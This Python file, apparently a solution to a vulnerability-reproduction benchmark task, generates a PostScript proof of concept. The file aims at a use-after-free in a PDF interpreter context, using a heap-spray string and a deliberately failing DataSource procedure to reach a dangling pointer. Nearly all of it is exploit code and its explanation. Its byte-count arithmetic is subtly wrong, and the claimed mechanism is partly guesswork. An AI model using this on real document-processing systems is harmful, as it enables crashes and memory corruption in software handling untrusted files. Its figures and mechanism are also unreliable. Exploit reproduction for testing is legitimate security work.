class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The PoC is a PostScript file that exploits a Use-After-Free vulnerability.
        The vulnerability trigger sequence is as follows:
        1.  A PDF interpreter context (`pdfi`) is created without an initial data
            stream by calling the `pdfopen` operator with an empty dictionary.
            This leaves a `pdfi` object on the stack.
        2.  A heap grooming phase allocates a large string. This string is intended
            to later overwrite a freed memory region. The size is chosen to match
            the ground-truth PoC length, suggesting the size of the vulnerable
            buffer is known.
        3.  The `setpdfparams` operator is called on the created `pdfi` context.
            The parameters include a `/DataSource` procedure designed to fail
            (by throwing a `typecheck` error).
        4.  During the execution of `setpdfparams`, the failing `DataSource`
            triggers an error-handling path. In this path, a stream buffer
            is allocated and subsequently freed, but a pointer to this freed
            memory is not cleared from the `pdfi` context, creating a
            dangling pointer.
        5.  The memory region of the freed buffer is likely reallocated and
            overwritten by the large groom string created in step 2.
        6.  Finally, the `pdfgetpage` operator is called. This operator uses the
            `pdfi` context and attempts to read from the data stream via the
            dangling pointer. It ends up accessing the memory now containing
            the groom string.
        7.  Interpreting the groom string's contents (e.g., 'AAAA...') as PDF
            stream data leads to an invalid memory access, causing a crash.

        The `stopped` operator is used to catch the expected error from `setpdfparams`
        and allow the script to proceed to the final step that triggers the crash.
        """

        # The overhead is the length of the PostScript code scaffold, excluding
        # the content of the spray string. It is pre-calculated for efficiency.
        # Calculation:
        # len(b"%!PS-Adobe-3.0") -> 15
        # len(b"/spraystring () def") -> 19
        # len(b"/sprayarray [ spraystring spraystring spraystring spraystring ] def") -> 59
        # len(b"<<>> pdfopen /pdfctx exch def") -> 29
        # len(b"/params << /DataSource { /typecheck /errorname get exec } >> def") -> 65
        # len(b"{ pdfctx params setpdfparams } stopped pop") -> 40
        # len(b"pdfctx 1 pdfgetpage") -> 18
        # len(b"showpage") -> 8
        # Number of newlines -> 7
        # Total overhead = 15+19+59+29+65+40+18+8+7 = 260
        overhead = 260
        target_size = 13996
        spray_size = target_size - overhead

        spray_content = b'A' * spray_size

        poc_parts = [
            b"%!PS-Adobe-3.0",
            b"/spraystring (" + spray_content + b") def",
            b"/sprayarray [ spraystring spraystring spraystring spraystring ] def",
            b"<<>> pdfopen /pdfctx exch def",
            b"/params << /DataSource { /typecheck /errorname get exec } >> def",
            b"{ pdfctx params setpdfparams } stopped pop",
            b"pdfctx 1 pdfgetpage",
            b"showpage",
        ]

        poc = b"\n".join(poc_parts)
        return poc